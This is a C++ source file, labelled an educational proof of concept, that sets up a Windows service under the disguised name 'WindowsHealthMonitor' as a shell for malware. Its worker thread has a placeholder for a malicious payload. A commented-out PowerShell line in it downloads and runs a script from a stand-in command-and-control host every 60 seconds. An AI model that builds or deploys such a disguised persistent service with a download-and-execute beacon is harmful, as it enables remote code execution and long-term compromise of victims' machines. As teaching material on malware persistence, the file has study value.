#include <stdio.h>
#include <windows.h>


// ServiceForge - Malicious Windows Service Logic
// Educational Proof-of-Concept
// Compile: g++ ServiceForge.cpp -o ServiceForge.exe

SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
VOID WINAPI ServiceCtrlHandler(DWORD);
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);

#define SERVICE_NAME "WindowsHealthMonitor"

int main(int argc, char *argv[]) {
  SERVICE_TABLE_ENTRY ServiceTable[] = {
      {(LPSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
      {NULL, NULL}};

  if (StartServiceCtrlDispatcher(ServiceTable) == FALSE) {
    return GetLastError();
  }

  return 0;
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
  g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);

  if (g_StatusHandle == NULL)
    return;

  g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
  g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
  g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
  g_ServiceStatus.dwWin32ExitCode = 0;
  g_ServiceStatus.dwServiceSpecificExitCode = 0;
  g_ServiceStatus.dwCheckPoint = 0;

  SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

  g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
  if (g_ServiceStopEvent == NULL) {
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    return;
  }

  g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
  SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

  HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
  WaitForSingleObject(hThread, INFINITE);

  CloseHandle(g_ServiceStopEvent);
  g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
  SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
  switch (CtrlCode) {
  case SERVICE_CONTROL_STOP:
    if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
      break;
    g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    SetEvent(g_ServiceStopEvent);
    break;
  }
}

DWORD WINAPI ServiceWorkerThread(LPVOID lpParam) {
  // MALICIOUS PAYLOAD HERE
  // Loop forever to keep service running
  while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {
    // e.g., Beacon home every 60 seconds
    // system("powershell -c IEX(New-Object
    // Net.WebClient).DownloadString('http://c2/payload')");
    Sleep(60000);
  }
  return ERROR_SUCCESS;
}
